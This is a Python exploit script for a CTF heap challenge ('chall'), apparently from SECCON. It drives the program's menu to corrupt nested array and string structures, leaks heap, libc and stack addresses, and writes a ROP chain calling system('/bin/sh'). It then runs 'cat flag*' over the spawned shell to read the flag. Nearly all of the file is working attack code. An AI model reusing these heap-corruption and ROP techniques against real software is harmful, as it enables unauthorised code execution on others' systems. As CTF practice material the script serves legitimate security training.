#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './chall'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote', 'monitor')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET', monitor = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False, 'gdbscript':''}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'localhost', 'port':4296}, \
                        monitor = {'host':os.getenv('SECCON_HOST'), 'port':os.getenv('SECCON_PORT')})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc.so.6', \
                        monitor = 'libc.so.6')
env.select('monitor')

#==========

binf = ELF(bin_file)

libc = ELF(env.libc) if env.libc else binf.libc
ofs_libc_stdin          = libc.symbols['_IO_2_1_stdin_']
ofs_libc_mainarena      = ofs_libc_stdin + 0x1e0

#==========

def attack(conn, **kwargs):
    bc = DataStore(conn)

    bc.update_array(5)
    bc.update_array(1, (0,))
    bc.update_array(0x10, (1,))
    for i in range(8):
        bc.update_array(0x10, (1,)+(0,)*(i+1))

    bc.delete_item((1,))
    bc.update_value(b'a'*0x8+p32(0xfeed0003), (1,))

    bc.delete_item((5,))
    bc.delete_item((0,1))
    bc.update_value(3, (5,))

    l = bc.list()
    addr_heap_base = l[0][2] - 0x450
    info('addr_heap_base    = 0x{:08x}'.format(addr_heap_base))

    bc.update_value(b'x'*0x10+p64(0x1000)+p64(addr_heap_base+0x4b0), (2,))
    bc.update_string(b'b'*0x8+p8(0x02), (1,))

    l = bc.list()
    addr_libc_mainarena = u(l[0][2]) - 0x60
    libc.address = addr_libc_mainarena - ofs_libc_mainarena
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_str_sh    = next(libc.search(b'/bin/sh'))
    addr_libc_environ   = libc.symbols['environ']

    bc.update_array(10, (3,))

    fake_array  = p64(1)
    fake_array += flat(0xfeed0002, addr_heap_base+0x4c0+0x10*1, -1)
    fake_str    = flat(0x1000, addr_libc_environ)
    bc.update_string(fake_array + fake_str, (0,2,))

    l = bc.list()
    addr_stack = u(l[3][0])
    info('addr_stack        = 0x{:08x}'.format(addr_stack))

    fake_array  = p64(1)
    fake_array += flat(0xfeed0002, addr_heap_base+0x4c0+0x10*1, -1)
    fake_str    = flat(0x1000, addr_stack - 0x180)
    bc.update_string(fake_array + fake_str, (0,2,))

    rop = ROP(libc)
    rop.system(addr_libc_str_sh)
    bc.update_string(p64(rop.ret.address)*0xf+bytes(rop), (3,0,))

class DataStore:
    def __init__(self, conn):
        self.recv           = conn.recv
        self.recvuntil      = conn.recvuntil
        self.recvline       = conn.recvline
        self.unrecv         = conn.unrecv
        self.send           = conn.send
        self.sendline       = conn.sendline
        self.sendafter      = conn.sendafter
        self.sendlineafter  = conn.sendlineafter

    def update_array(self, size, path = ()):
        self.sendlineafter(b'Exit\n> ', b'1')

        for idx in path:
            self.sendlineafter(b'index: ', str(idx).encode())
            self.sendlineafter(b'> ', b'1')

        self.sendlineafter(b'[a]rray/[v]alue\n> ', b'a')
        self.sendlineafter(b'size: ', str(size).encode())

    def update_string(self, data, path = ()):
        self.sendlineafter(b'Exit\n> ', b'1')

        for idx in path:
            self.sendlineafter(b'index: ', str(idx).encode())
            self.sendlineafter(b'> ', b'1')

        self.sendafter(b'bytes): ', data)

    def update_value(self, value, path = ()):
        self.sendlineafter(b'Exit\n> ', b'1')

        for idx in path:
            self.sendlineafter(b'index: ', str(idx).encode())
            self.sendlineafter(b'> ', b'1')

        self.sendlineafter(b'[a]rray/[v]alue\n> ', b'v')
        if not isinstance(value, bytes):
            value = str(value).encode()
        self.sendlineafter(b'value', value)

    def delete_item(self, path):
        self.sendlineafter(b'Exit\n> ', b'1')

        for idx in path[:-1]:
            self.sendlineafter(b'index: ', str(idx).encode())
            self.sendlineafter(b'> ', b'1')

        self.sendlineafter(b'index: ', str(path[-1]).encode())
        self.sendlineafter(b'> ', b'2')

    def list(self):
        self.sendlineafter(b'Exit\n> ', b'2')

        def parse_list(l, n = 1):
            ret = []
            prog = re.compile(b'\d+\] \<(.+)\>\s*((.|\s)*)')

            for s in l:
                m = prog.match(s)

                t = m.group(1)
                d = m.group(2)
                if t.startswith(b'ARRAY'):
                    ret += [parse_list(d[1:].split('\n{}['.format(' '*n*4).encode()), n+1)]
                elif t == b'S':
                    ret += [d]
                elif t == b'I':
                    ret += [int(d)]
                elif t == b'F':
                    ret += [float(d)]
                else:
                    ret += [None]
            return ret
        return parse_list(self.recvuntil(b'\n\nMENU', drop=True).split(b'\n[')[1:])

def getflag(conn, **kwargs):
    sleep(0.1)
    conn.sendline(b'exec 2>&1')
    sleep(0.1)
    conn.sendline(b'echo FLAG_HERE; cat flag*')
    conn.recvuntil(b'FLAG_HERE\n')
    print('FLAG : %s' % conn.recvline(keepends=False).decode())

#==========

def main():
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)

    if env.check('monitor'):
        comn.run(getflag)
    else:
        comn.interactive()

if __name__=='__main__':
    main()

#==========
